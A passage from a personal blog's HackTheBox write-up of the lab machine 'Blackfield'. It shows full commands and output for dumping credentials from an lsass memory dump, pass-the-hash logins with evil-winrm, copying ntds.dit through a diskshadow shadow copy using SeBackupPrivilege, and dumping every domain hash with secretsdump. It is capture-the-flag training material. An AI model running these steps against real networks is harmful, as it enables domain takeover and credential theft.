<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ crackmapexec smb 10.10.10.192 -u <span class="string">&#x27;audit2020&#x27;</span> -p <span class="string">&#x27;faris123.&#x27;</span>      </span><br><span class="line">SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.<span class="built_in">local</span>) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.<span class="built_in">local</span>\audit2020:faris123. </span><br><span class="line">                                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/HTB/blackfield]</span><br><span class="line">└─$ crackmapexec winrm 10.10.10.192 -u <span class="string">&#x27;audit2020&#x27;</span> -p <span class="string">&#x27;faris123.&#x27;</span></span><br><span class="line">SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.<span class="built_in">local</span>)</span><br><span class="line">HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman</span><br><span class="line">HTTP        10.10.10.192    5985   DC01             [-] BLACKFIELD.<span class="built_in">local</span>\audit2020:faris123.</span><br></pre></td></tr></table></figure>

<p>The interesting thing that pops to us is the availability of SMB Share <code>forensic</code> , so we list it out.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ smbclient \\\\10.10.10.192\\forensic -U audit2020</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\audit2020]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">dir</span></span><br><span class="line">  .                                   D        0  Sun Feb 23 14:03:16 2020</span><br><span class="line">  ..                                  D        0  Sun Feb 23 14:03:16 2020</span><br><span class="line">  commands_output                     D        0  Sun Feb 23 19:14:37 2020</span><br><span class="line">  memory_analysis                     D        0  Thu May 28 22:28:33 2020</span><br><span class="line">  tools                               D        0  Sun Feb 23 14:39:08 2020</span><br><span class="line"></span><br><span class="line">                5102079 blocks of size 4096. 1662505 blocks available</span><br><span class="line">smb: \&gt; </span><br></pre></td></tr></table></figure>

<h2 id="lsass-DMP-Jackpot"><a href="#lsass-DMP-Jackpot" class="headerlink" title="lsass.DMP Jackpot"></a>lsass.DMP Jackpot</h2><p>Since I went to a rabbit hole on this part, I’ll go straight to the point and reveal that there is <code>lsass.zip</code> available, that contains <code>lsass.DMP</code> . </p>
<p><img src="/Portfolio-Website/img/blackfield-image2.png" alt="/img/blackfield-image2.png"></p>
<aside>
💡 … it is a jackpot if you find this file. Its full form is “Local Security Authority Subsystem Service”. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. it means you can find passwords in its dump file.
</aside>
Reference: https://technicalnavigator.in/how-to-extract-information-from-dmp-files/

<p>We can utilize the tool called pypykatz, which tends to be a similar implementation of popular mimikatz, and this helped us to move further. Nevertheless, we should always go for quick wins like  dumping the hashes in the domain with a DCSync, but unfortunately, no luck…</p>
<p>Account that turned out to be our next link in the attack chain is <code>svc_backup</code> .</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">└─$ pypykatz lsa minidump lsass.DMP</span><br><span class="line">INFO:pypykatz:Parsing file lsass.DMP</span><br><span class="line">FILE: ======== lsass.DMP =======</span><br><span class="line">== LogonSession ==</span><br><span class="line">authentication_id 406458 (633ba)</span><br><span class="line">session_id 2</span><br><span class="line">username svc_backup</span><br><span class="line">domainname BLACKFIELD</span><br><span class="line">logon_server DC01</span><br><span class="line">logon_time 2020-02-23T18:00:03.423728+00:00</span><br><span class="line">sid S-1-5-21-4194615774-2175524697-3563712290-1413</span><br><span class="line">luid 406458</span><br><span class="line">        == MSV ==</span><br><span class="line">                Username: svc_backup</span><br><span class="line">                Domain: BLACKFIELD</span><br><span class="line">                LM: NA</span><br><span class="line">                NT: 9658d1d1dcd9250115e2205d9f48400d</span><br><span class="line">                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c</span><br><span class="line">                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000</span><br><span class="line">        == WDIGEST [633ba]==</span><br><span class="line">                username svc_backup</span><br><span class="line">                domainname BLACKFIELD</span><br><span class="line">                password None</span><br><span class="line">                password (hex)</span><br><span class="line">        == Kerberos ==</span><br><span class="line">                Username: svc_backup</span><br><span class="line">                Domain: BLACKFIELD.LOCAL</span><br><span class="line">        == WDIGEST [633ba]==</span><br><span class="line">                username svc_backup</span><br><span class="line">                domainname BLACKFIELD</span><br><span class="line">                password None</span><br><span class="line">                password (hex)</span><br></pre></td></tr></table></figure>

<p>One important lesson I’ve learned is to utilize Pass-the-Hash attacks when attempting to obtain shells, rather than exhaustively striving to crack hashes when it isn’t necessary.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ crackmapexec winrm 10.10.10.192 -u <span class="string">&#x27;svc_backup&#x27;</span> -H 9658d1d1dcd9250115e2205d9f48400d</span><br><span class="line">SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.<span class="built_in">local</span>)</span><br><span class="line">HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman</span><br><span class="line">HTTP        10.10.10.192    5985   DC01             [+] BLACKFIELD.<span class="built_in">local</span>\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)</span><br></pre></td></tr></table></figure>

<p>It turns out that we are able to connect using the <code>svc_backup</code> and its shell, so lets try that first.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ evil-winrm -i 10.10.10.192 -u <span class="string">&#x27;svc_backup&#x27;</span> -H 9658d1d1dcd9250115e2205d9f48400d</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                   </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     </span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">blackfield\svc_backup</span><br></pre></td></tr></table></figure>

<h2 id="Vertical-privilege-escalation"><a href="#Vertical-privilege-escalation" class="headerlink" title="Vertical privilege escalation"></a>Vertical privilege escalation</h2><p>There are many ways to perform the enumeration once we have a low-privileged shell, such as winpeas, PowerUp and so on. For purposes of this writeup, I will go with a manual way.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span> Enabled</span><br></pre></td></tr></table></figure>

<p>SeBackupPrivilege is what are we going to focus on, since it allows users to create backup copies on the system. That means that the user could potentially have a full read access to the file system → sensitive files such as SAM or SYSTEM Registry File are exposed.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; <span class="built_in">cd</span> c:\windows\temp</span><br><span class="line">*Evil-WinRM* PS C:\windows\temp&gt; reg save hklm\sam c:\windows\temp\sam</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\windows\temp&gt; reg save hklm\system c:\windows\temp\system</span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure>

<aside>
💡 Another rabbit hole that I have been stuck at is this situation where we obtained `sam` and `system` files, but dumping gets us nowhere, because we still need the **`ntds.dit`** file as that is the domain controller equivalent of the local SAM file.

</aside>

<h2 id="Dumping-the-NTDS-dit"><a href="#Dumping-the-NTDS-dit" class="headerlink" title="Dumping the NTDS.dit"></a><strong>Dumping the NTDS.dit</strong></h2><p>I have done again a quick Google search and kudos to Hacking Articles (reference:<a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/</a> ) for showing this exploit.</p>
<p>The main problem here with dumping the NTDS.dit is that the target machine is running, what indicates that the file is always in usage, furthermore we cannot copy the file using any conventional methods. What can do, is to create a Distributed Shell File, which is going to trigger the diskshadow to create a copy of C: Drive with our own alias.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> faris.dsh                                                                                    </span><br><span class="line"><span class="built_in">set</span> context persistent nowriters</span><br><span class="line">add volume c: <span class="built_in">alias</span> faris</span><br><span class="line">create</span><br><span class="line">expose %faris% z:-</span><br></pre></td></tr></table></figure>

<p>On targets machine we upload and trigger the <code>faris.dsh</code> file:</p>
<aside>
💡 There are built-in functions like `upload` and `download` if we are using evil-winrm. In this writeup I will not cover the principles of transferring the files between attacker and target.

</aside>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\windows\temp&gt; diskshadow /s faris.dsh</span><br><span class="line">Microsoft DiskShadow version 1.0</span><br><span class="line">Copyright (C) 2013 Microsoft Corporation</span><br><span class="line">On computer:  DC01,  8/17/2024 11:10:09 PM</span><br><span class="line"></span><br><span class="line">-&gt; <span class="built_in">set</span> context persistent nowriters</span><br><span class="line">-&gt; add volume c: <span class="built_in">alias</span> faris</span><br><span class="line">-&gt; create</span><br><span class="line">Alias faris <span class="keyword">for</span> shadow ID &#123;43bf6392-dc24-4a43-aa53-81c0da3447ac&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line">Alias VSS_SHADOW_SET <span class="keyword">for</span> shadow <span class="built_in">set</span> ID &#123;45fca1d1-3d1a-4481-bd05-7a0b4e37b648&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line"></span><br><span class="line">Querying all shadow copies with the shadow copy <span class="built_in">set</span> ID &#123;45fca1d1-3d1a-4481-bd05-7a0b4e37b648&#125;</span><br><span class="line"></span><br><span class="line">        * Shadow copy ID = &#123;43bf6392-dc24-4a43-aa53-81c0da3447ac&#125;               %faris%</span><br><span class="line">                - Shadow copy <span class="built_in">set</span>: &#123;45fca1d1-3d1a-4481-bd05-7a0b4e37b648&#125;       %VSS_SHADOW_SET%</span><br><span class="line">                - Original count of shadow copies = 1</span><br><span class="line">                - Original volume name: \\?\Volume&#123;6cd5140b-0000-0000-0000-602200000000&#125;\ [C:\]</span><br><span class="line">                - Creation time: 8/17/2024 11:10:11 PM</span><br><span class="line">                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br><span class="line">                - Originating machine: DC01.BLACKFIELD.<span class="built_in">local</span></span><br><span class="line">                - Service machine: DC01.BLACKFIELD.<span class="built_in">local</span></span><br><span class="line">                - Not exposed</span><br><span class="line">                - Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125;</span><br><span class="line">                - Attributes:  No_Auto_Release Persistent No_Writers Differential</span><br><span class="line"></span><br><span class="line">Number of shadow copies listed: 1</span><br><span class="line">-&gt; expose %faris% z:</span><br><span class="line">-&gt; %faris% = &#123;43bf6392-dc24-4a43-aa53-81c0da3447ac&#125;</span><br><span class="line">The  drive letter is already <span class="keyword">in</span> use.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\windows\temp&gt; robocopy /b z:\windows\ntds . ntds.dit</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">   ROBOCOPY     ::     Robust File Copy <span class="keyword">for</span> Windows</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">  Started : Saturday, August 17, 2024 11:11:36 PM</span><br><span class="line">   Source : z:\windows\ntds\</span><br><span class="line">     Dest : C:\windows\temp\</span><br><span class="line"></span><br><span class="line">    Files : ntds.dit</span><br><span class="line"></span><br><span class="line">  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">                           1    z:\windows\ntds\</span><br><span class="line">            New File              18.0 m        ntds.dit</span><br><span class="line">  0.0%</span><br><span class="line">  0.3%</span><br><span class="line">  0.6%</span><br><span class="line">  1.0%</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>We can proceed to get the missing part of the puzzle and download the <code>ntds.dit</code> .</p>
<h2 id="secretsdump-py-to-Dump-All-of-the-Hashes-in-the-Domain"><a href="#secretsdump-py-to-Dump-All-of-the-Hashes-in-the-Domain" class="headerlink" title="secretsdump.py to Dump All of the Hashes in the Domain"></a>secretsdump.py to Dump All of the Hashes in the Domain</h2><p>There is no need to downlod system hive file again from the temp directory, we can just execute the <code>secretsdump.py</code> and fire up pass-the-hash attack with newly obtained Administrator hash.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ secretsdump.py -ntds ntds.dit -system system LOCAL    </span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span></span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f8b1d273c32b63d4bedc95f360b47f97:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::</span><br><span class="line">audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::</span><br><span class="line">support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::</span><br><span class="line">BLACKFIELD.<span class="built_in">local</span>\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::</span><br><span class="line">BLACKFIELD.<span class="built_in">local</span>\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<aside>
💡 When cracking NTLM hash it is enough to capture only the second part (NT part).

</aside>

<p>We utilize the port that is opened on 5985 once again, and it seems like we can “cat out” the root flag successfully!!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                                       </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         </span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">blackfield\administrator</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cd</span> c:\<span class="built_in">users</span>\administrator\desktop</span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\administrator\desktop&gt; <span class="built_in">type</span> root.txt</span><br><span class="line">4375****************************</span><br></pre></td></tr></table></figure></article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/Portfolio-Website/2024/08/25/Holo/" title="Holo - TryHackMe"><img class="cover" src="/Portfolio-Website/img/hololive_cover.png" onerror="onerror=null;src='/Portfolio-Website/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">Holo - TryHackMe</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/Portfolio-Website/img/portrait_crop.JPG" onerror="this.onerror=null;this.src='/Portfolio-Website/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Faris Mujcinagic</div><div class="author-info__description">Computer science student with an interest in cybersecurity</div></div><div class="card-info-data site-data is-center"><a href="/Portfolio-Website/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/Portfolio-Website/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/Portfolio-Website/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fmujcinagic"><i class="fab fa-github"></i><span>Explore my GitHub</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/fmujcinagic" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:faris1306@hotmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/faris-mujcinagic/" target="_blank" title="LinkedIn"><i class="fab fa-linked" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is a website where I post my writeups from HackTheBox & TryHackMe, along with side projects!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Short-Summary"><span class="toc-number">1.</span> <span class="toc-text">Short Summary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Walkthrough"><span class="toc-number">2.</span> <span class="toc-text">Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration-and-Discovery-of-Usernames"><span class="toc-number">2.1.</span> <span class="toc-text">SMB Enumeration and Discovery of Usernames</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-number">2.2.</span> <span class="toc-text">AS-REP Roasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Foothold-and-Bloodhound-Enumeration"><span class="toc-number">2.3.</span> <span class="toc-text">Initial Foothold and Bloodhound Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ForceChangePassword"><span class="toc-number">2.4.</span> <span class="toc-text">ForceChangePassword</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lsass-DMP-Jackpot"><span class="toc-number">2.5.</span> <span class="toc-text">lsass.DMP Jackpot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vertical-privilege-escalation"><span class="toc-number">2.6.</span> <span class="toc-text">Vertical privilege escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dumping-the-NTDS-dit"><span class="toc-number">2.7.</span> <span class="toc-text">Dumping the NTDS.dit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#secretsdump-py-to-Dump-All-of-the-Hashes-in-the-Domain"><span class="toc-number">2.8.</span> <span class="toc-text">secretsdump.py to Dump All of the Hashes in the Domain</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/Portfolio-Website/2024/08/29/blackfield/" title="BlackField - HackTheBox"><img src="/Portfolio-Website/img/blackfield2.png" onerror="this.onerror=null;this.src='/Portfolio-Website/img/404.jpg'" alt="BlackField - HackTheBox"/></a><div class="content"><a class="title" href="/Portfolio-Website/2024/08/29/blackfield/" title="BlackField - HackTheBox">BlackField - HackTheBox</a><time datetime="2024-08-28T22:00:00.000Z" title="Created 2024-08-29 00:00:00">2024-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Portfolio-Website/2024/08/25/Holo/" title="Holo - TryHackMe"><img src="/Portfolio-Website/img/hololive_cover.png" onerror="this.onerror=null;this.src='/Portfolio-Website/img/404.jpg'" alt="Holo - TryHackMe"/></a><div class="content"><a class="title" href="/Portfolio-Website/2024/08/25/Holo/" title="Holo - TryHackMe">Holo - TryHackMe</a><time datetime="2024-08-25T12:13:05.000Z" title="Created 2024-08-25 14:13:05">2024-08-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Portfolio-Website/2024/08/20/wreath/" title="Wreath - TryHackMe"><img src="/Portfolio-Website/img/wreath_cover.png" onerror="this.onerror=null;this.src='/Portfolio-Website/img/404.jpg'" alt="Wreath - TryHackMe"/></a><div class="content"><a class="title" href="/Portfolio-Website/2024/08/20/wreath/" title="Wreath - TryHackMe">Wreath - TryHackMe</a><time datetime="2024-08-20T11:07:07.000Z" title="Created 2024-08-20 13:07:07">2024-08-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/Portfolio-Website/img/blackfield2.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Faris Mujcinagic</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/Portfolio-Website/js/utils.js?v=4.13.0"></script><script src="/Portfolio-Website/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div></div></body></html>